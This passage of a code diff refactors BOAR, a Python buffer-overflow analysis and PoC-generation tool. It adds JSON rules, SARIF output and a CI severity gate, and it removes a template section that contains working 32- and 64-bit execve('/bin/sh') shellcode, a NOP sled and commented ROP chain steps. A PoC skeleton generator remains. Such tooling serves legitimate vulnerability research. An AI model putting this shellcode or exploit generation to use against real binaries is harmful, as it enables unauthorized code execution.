-    # ropper --file {binary_path} --search "pop rdi"
-    rop_chain = b""
-    
-    # Example ROP chain for system("/bin/sh")
-    # rop_chain += p{arch}(pop_rdi_gadget)
-    # rop_chain += p{arch}(bin_sh_string_addr)
-    # rop_chain += p{arch}(system_addr)
-    
-    return rop_chain
-
-def build_shellcode():
-    \"\"\"Build shellcode for direct execution\"\"\"
-    # NOP sled
-    nop_sled = b'\\x90' * 16
-    
-    # Shellcode examples
-    if ARCH == 32:
-        # 32-bit execve("/bin/sh") shellcode
-        shellcode = (
-            b"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e"
-            b"\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80"
-        )
-    else:
-        # 64-bit execve("/bin/sh") shellcode
-        shellcode = (
-            b"\\x48\\x31\\xd2\\x52\\x48\\xb8\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68"
-            b"\\x50\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\\x48\\x31\\xc0\\xb0\\x3b\\x0f\\x05"
-        )
-    
-    return nop_sled + shellcode
 
 def exploit():
     \"\"\"Main exploit function\"\"\"
@@ -755,7 +632,7 @@ def exploit():
     print(f"[*] Payload length: {{len(payload)}} bytes")
     print(f"[*] Offset: {{OFFSET}} bytes")
     print(f"[*] Target architecture: {{ARCH}}-bit")
-    print(f"[*] Active protections: {{[k for k, v in PROTECTIONS.items() if v]}}")
+    print(f"[*] Active protections: {{active_protections()}}")
     
     # Launch target
     print(f"[*] Launching target: {{BINARY_PATH}}")
@@ -808,10 +685,9 @@ def info():
         print("  2. ⚠️  NX/DEP: Use ROP chain for code execution")
     if PROTECTIONS.get('pie'):
         print("  3. ⚠️  PIE: Need information leak for base address")
-    if PROTECTIONS.get('aslr'):
-        print("  4. ⚠️  ASLR: Combine with PIE bypass techniques")
+    print("  4. ASLR is system-wide; check /proc/sys/kernel/randomize_va_space")
     
-    if not any(PROTECTIONS.values()):
+    if not active_protections():
         print("  ✅ No major protections detected - direct exploitation possible")
     
     print()
@@ -837,7 +713,7 @@ if __name__ == "__main__":
     with open(poc_filename, "w") as f:
         f.write(exploit_template)
     
-    print(f"\n[+] 🎯 Advanced PoC script generated: '{poc_filename}'")
+    print(f"\n[+] 🎯 PoC skeleton generated: '{poc_filename}'")
     print(f"[*] Usage:")
     print(f"  python3 {poc_filename}          # Basic exploit")
     print(f"  python3 {poc_filename} info     # Show exploit info")
@@ -865,32 +741,46 @@ def generate_poc_script(binary_path, offset):
 
 def main():
     parser = argparse.ArgumentParser(
-        description="🛡️  BOAR - Advanced Buffer Overflow Analysis & Remediation Framework",
+        description="🛡️  BOAR - Rule-based Memory-Safety Analysis Framework",
         formatter_class=argparse.RawTextHelpFormatter,
         epilog="""
 Examples:
-  # Static analysis with CVE-based detection
+  # Static analysis with JSON rules
   python BOAR_beta.py static /path/to/code
-  
-  # Dynamic analysis with advanced crash detection
+
+  # JSON report with a CI severity gate
+  python BOAR_beta.py static /path/to/code --format json --fail-on high
+
+  # Dynamic analysis with crash classification
   python BOAR_beta.py dynamic ./vulnerable_binary -l 1000 -m stdin
-  
-  # Generate advanced PoC with exploit templates
-  python BOAR_beta.py poc ./vulnerable_binary -o 268
+
+  # Generate a PoC skeleton
+  python BOAR_beta.py poc ./vulnerable_binary -o 268 --advanced
         """
     )
     
+    parser.add_argument("--no-banner", "-q", action="store_true",
+                        help="Suppress the startup ASCII banner")
     subparsers = parser.add_subparsers(dest="command", required=True, help="Available commands")
 
     # Static analysis command
-    parser_static = subparsers.add_parser("static", help="CVE-based static analysis")
+    parser_static = subparsers.add_parser("static", help="Memory-safety static analysis")
     parser_static.add_argument("target", help="File or directory to analyze")
-    parser_static.add_argument("--output", "-o", help="Output format (json/text)", default="text")
-    parser_static.add_argument("--severity", "-s", choices=['all', 'critical', 'high', 'medium'], 
-                              default='all', help="Filter by severity level")
+    parser_static.add_argument("--format", "-o", "--output", dest="format",
+                              choices=["text", "json", "jsonl", "sarif"], default="text",
+                              help="Output format (default: text)")
+    parser_static.add_argument("--severity", "-s",
+                              choices=['all', 'critical', 'high', 'medium', 'low'],
+                              default='all', help="Filter findings by exact severity")
+    parser_static.add_argument("--rules", action="append", metavar="PATH",
+                              help="Extra JSON rule file or directory (repeatable)")
+    parser_static.add_argument("--report", metavar="PATH",
+                              help="Write the JSON report to PATH")
+    parser_static.add_argument("--fail-on", choices=["critical", "high", "medium", "low"],
+                              help="Exit with status 1 when a finding reaches this severity")
 
     # Dynamic analysis command
-    parser_dynamic = subparsers.add_parser("dynamic", help="Advanced dynamic analysis")
+    parser_dynamic = subparsers.add_parser("dynamic", help="Crash and protection analysis")
     parser_dynamic.add_argument("binary", help="Binary file to analyze")
     parser_dynamic.add_argument("-l", "--length", type=int, default=1000, 
                                help="Payload length (default: 1000)")
@@ -902,49 +792,57 @@ Examples:
                                help="Check binary security protections")
 
     # PoC generation command
-    parser_poc = subparsers.add_parser("poc", help="Generate advanced PoC scripts")
+    parser_poc = subparsers.add_parser("poc", help="Generate a PoC skeleton")
     parser_poc.add_argument("binary", help="Target binary")
     parser_poc.add_argument("-o", "--offset", type=int, required=True, 
                            help="Buffer overflow offset")
     parser_poc.add_argument("--arch", choices=[32, 64], type=int, default=32,
                            help="Target architecture (default: 32)")
     parser_poc.add_argument("--advanced", action="store_true",
-                           help="Generate advanced exploitation templates")
+                           help="Generate the PoC skeleton with protection context")
 
     # Info command
     parser_info = subparsers.add_parser("info", help="Show tool information and statistics")
 
     args = parser.parse_args()
 
-    # Print epic dragon banner
-    print_dragon_banner()
+    if not args.no_banner:
+        print_dragon_banner()
 
     try:
         if args.command == "static":
-            run_static_analysis(args.target)
-            
+            rules = load_rules(args.rules)
+            report = run_static_analysis(
+                args.target, rules, args.severity, args.format, args.report,
+            )
+            if report and reaches_threshold(report["findings"], args.fail_on):
+                sys.exit(1)
+
         elif args.command == "dynamic":
             if args.check_protections:
                 protections = check_binary_protections(args.binary)
                 print(f"Binary protections: {protections}")
+                print(f"Active protections: {active_protections(protections)}")
+                return
             run_dynamic_analysis(args.binary, args.length, args.debug, args.method)
-            
+
         elif args.command == "poc":
             if args.advanced:
                 protections = check_binary_protections(args.binary)
                 generate_advanced_poc_script(args.binary, args.offset, args.arch, protections)
             else:
                 generate_poc_script(args.binary, args.offset)
-                
+
         elif args.command == "info":
+            rules = load_rules()
             print("🔥 BOAR Framework Information:")
-            print(f"- CVE Patterns: {len(CVE_PATTERNS)}")
-            print(f"- Complex Patterns: {len(COMPLEX_VULNERABILITY_PATTERNS)}")
+            print(f"- Rules: {len(rules)} JSON templates")
+            print(f"- Matchers: {len(set(rule['matcher'] for rule in rules))}")
             print("- Supported Architectures: 32-bit, 64-bit")
             print("- Supported Input Methods: stdin, argv")
-            print("- Protection Detection: Canary, NX, PIE, RELRO, ASLR")
-            print("- Output Formats: JSON, HTML, Text")
-            
+            print("- Protection Detection: Canary, NX, PIE, RELRO, FORTIFY + host ASLR")
+            print("- Output Formats: text, json, jsonl, sarif")
+
         else:
             parser.print_help()
             
